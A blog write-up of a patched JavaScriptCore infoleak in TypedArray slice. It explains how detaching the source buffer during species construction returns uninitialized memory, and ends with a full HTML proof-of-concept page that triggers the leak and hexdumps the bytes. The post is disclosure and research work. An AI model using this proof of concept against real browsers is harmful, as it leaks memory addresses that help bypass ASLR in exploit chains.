---
layout: post
title:  "JSC %TypedArray%.slice infoleak"
date:   2016-09-19
categories: bugs
---
Just a very quick writeup of a bug I found in JavaScriptCore a few weeks ago. The code was at that time only shipping in the [Safari Technology Preview][safari-tech-preview] and got fixed there with [release 12][release-notes].

The bug was located in TypedArrayView.prototype.slice when performing [species construction][species-constructor].
From [JSGenericTypedArrayViewPrototypeFunctions.h][source]:

{% highlight C++ %}
template<typename ViewClass>
EncodedJSValue JSC_HOST_CALL genericTypedArrayViewProtoFuncSlice(ExecState* exec)
{

    // ...

    JSArrayBufferView* result = speciesConstruct(exec, thisObject, args, [&]() {
        Structure* structure = callee->globalObject()->typedArrayStructure(ViewClass::TypedArrayStorageType);
        return ViewClass::createUninitialized(exec, structure, length);
    });
    if (exec->hadException())
        return JSValue::encode(JSValue());

    // --1--

    // We return early here since we don't allocate a backing store if length is 0 and memmove does not like nullptrs
    if (!length)
        return JSValue::encode(result);

    // The species constructor may return an array with any arbitrary length.
    length = std::min(length, result->length());
    switch (result->classInfo()->typedArrayStorageType) {
    case TypeInt8:
        jsCast<JSInt8Array*>(result)->set(exec, 0, thisObject, begin, length, CopyType::LeftToRight);
        break;

    /* other cases */
    }

    return JSValue::encode(result);
}
{% endhighlight %}

At --1-- there is no check if the *thisObject*'s buffer has been [transferred (detached/neutered)][arraybuffer-neutering] while executing a species constructor. Also note that the default constructor (the lambda expression) creates an uninitialized array. It is possible to detach the array buffer during *speciesConstruct* while also invoking the default constructor, for example by setting up the target array as follows:

{% highlight JavaScript %}
var a = new Uint8Array(N);
var c = new Function();
c.__defineGetter__(Symbol.species, function() { transferArrayBuffer(a.buffer); return undefined; });
a.constructor = c;
{% endhighlight %}

*JSGenericTypedArrayView::set* then does the following:

{% highlight C++ %}
template<typename Adaptor>
bool JSGenericTypedArrayView<Adaptor>::set(
    ExecState* exec, unsigned offset, JSObject* object, unsigned objectOffset, unsigned length, CopyType type)
{
    const ClassInfo* ci = object->classInfo();
    if (ci->typedArrayStorageType == Adaptor::typeValue) {
        // The super fast case: we can just memcpy since we're the same type.
        JSGenericTypedArrayView* other = jsCast<JSGenericTypedArrayView*>(object);
        length = std::min(length, other->length());

        RELEASE_ASSERT(other->canAccessRangeQuickly(objectOffset, length));
        if (!validateRange(exec, offset, length))
            return false;

        memmove(typedVector() + offset, other->typedVector() + objectOffset, length * elementSize);
        return true;
    }

    // ...
{% endhighlight %}

here, *other* will be the original array which is detached by now. Its length will be zero and memmove becomes a nop.
This results in an uninitialized array being returned to the caller, potentially leaking addresses and thus allowing for an ASLR bypass.

Here is a complete single-page application ;) to trigger the bug and dump the leaked data:

{% highlight html %}
<!DOCTYPE html>
<html>
<head>
    <style>
    body {
      font-family: monospace;
    }
    </style>

    <script>
    if (typeof window !== 'undefined') {
        print = function(msg) {
            document.body.innerText += msg + '\n';
        }
    }

    function hex(b) {
        return ('0' + b.toString(16)).substr(-2);
    }

    function hexdump(data) {
        if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
            data = Array.from(data);

        var lines = [];
        for (var i = 0; i < data.length; i += 16) {
            var chunk = data.slice(i, i+16);
            var parts = chunk.map(hex);
            if (parts.length > 8)
                parts.splice(8, 0, ' ');
            lines.push(parts.join(' '));
        }

        return lines.join('\n');
    }

    function trigger() {
        var worker = new Worker('worker.js');

        function transferArrayBuffer(ab) {
          worker.postMessage([ab], [ab]);
        }

        var a = null;

        var c = function(){};
        c.__defineGetter__(Symbol.species, function() { transferArrayBuffer(a.buffer); return undefined; });

        for (var i = 0; i < 1000; i++) {
            // Prepare array object
            a = new Uint8Array(new ArrayBuffer(1024));
            a.constructor = c;
            // Trigger the bug
            var b = a.slice(0, 1024);
            // Check if b now contains nonzero values
            if (b.filter((e) => e != 0).length > 0) {
                print('leaked data:');
                print(hexdump(b));
                break;
            }
        }
    }
    </script>
</head>
<body onload="trigger()">
    <p>please wait...</p><br />
</body>
</html>
{% endhighlight %}

The original report will eventually be available [here][report].

[species-constructor]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species
[safari-tech-preview]: https://developer.apple.com/safari/technology-preview/
[release-notes]: https://webkit.org/blog/6928/release-notes-for-safari-technology-preview-release-12/
[source]: https://github.com/WebKit/webkit/blob/cd8c9c1537739c0dd635a70d2d390ca7d3ae5873/Source/JavaScriptCore/runtime/JSGenericTypedArrayViewPrototypeFunctions.h#L406
[arraybuffer-neutering]: http://robert.ocallahan.org/2013/07/avoiding-copies-in-web-apis.html
[report]: https://bugs.webkit.org/show_bug.cgi?id=161031
